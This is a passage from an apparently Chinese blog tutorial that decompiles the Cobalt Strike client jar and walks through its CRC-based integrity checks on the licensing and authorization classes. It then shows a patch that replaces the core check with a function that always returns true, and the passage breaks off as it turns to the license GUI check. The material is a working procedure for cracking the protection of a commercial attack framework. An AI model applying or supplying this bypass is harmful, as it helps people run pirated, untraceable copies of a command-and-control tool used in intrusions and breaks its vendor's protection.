boolean">true</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> var3 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> var5 <span class="token operator">=</span> <span class="token number">0L</span><span class="token punctuation">;</span>        var3 <span class="token operator">=</span> <span class="token class-name">AuthCrypto</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/AuthCrypto.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">895661977L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var4 <span class="token operator">=</span> <span class="token string">"resources/authkey.pub"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1661186542L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isFileOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isFileOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">License</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/License.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1747926151L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">Authorization</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/Authorization.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1655604415L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">LicenseStatus</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/LicenseStatus.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3059950611L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/SleevedResource.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3881376138L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">AggressorInfo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/AggressorInfo.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1814321826L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">SleeveSecurity</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"dns/SleeveSecurity.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3962922538L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var5 <span class="token operator">-=</span> <span class="token number">159L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">BaseArtifactUtils</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/BaseArtifactUtils.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1905161680L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">BaseResourceUtils</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/BaseResourceUtils.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">510216517L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var5 <span class="token operator">/=</span> <span class="token number">2L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">PayloadGeneratorDialog</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"aggressor/dialogs/PayloadGeneratorDialog.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3766937686L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>调用isOk函数进行校验\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">isOK</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>var3<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">isOK</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>继续分析\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">isOK</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ZipFile</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> var6<span class="token punctuation">;</span>  <span class="token comment">//这里默认就是false</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            var5 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//校验一函数</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var6 <span class="token operator">=</span> <span class="token operator">!</span>var4<span class="token punctuation">;</span>                <span class="token keyword">return</span> var6<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            var6 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//正正校验二函数</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var5<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var14<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> var6<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span>  获取路径应该是     <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ZipFile</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> var2 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var3 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">ZipFile</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span>  这个函数是真正的校验函数   <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">ZipFile</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ZipEntry</span> var3 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getEntry</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var3<span class="token punctuation">.</span><span class="token function">getCrc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span> 使用crc进行校验     <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">long</span> var0<span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var3 <span class="token operator">&lt;</span> var2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> var2<span class="token punctuation">[</span>var3<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>回顾上面的操作说明了你只要修改 common&#x2F;AuthCrypto.class  common&#x2F;Authorization.class 等类就会触发校验退出系统下图函数里面的类<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101601245.png" alt="如图"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">initializeStarter</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//调用A函数进行校验操作</span>          <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p>所以我们要对initializeStarter函数进行修改它在\csproject\lib\cobaltstrike-client.jar!\common\Starter.class 。所以我们要来到反编译源码里面复制common\Starter.java(\csproject\DecompileSrc\common\Starter.java)到src里面和复制主类名一样的操作我就不截图了<br>我们直接修改代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bypass initializeStarter class checked 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> var2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>修改截图如下。直接把它的核心校验函数修改掉<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101618419.png" alt="修改核心校验函数"><br>继续走我们 走到如下图的函数</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">checkLicenseGUI</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们首先看checkLicenseGUI函数。我们可以看到校验核心是 Authorization 类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkLicenseGUI</span><span class="token punctuation">(</span><span class="token class-name">Authorization</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var0<span class="token punctuation">.</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 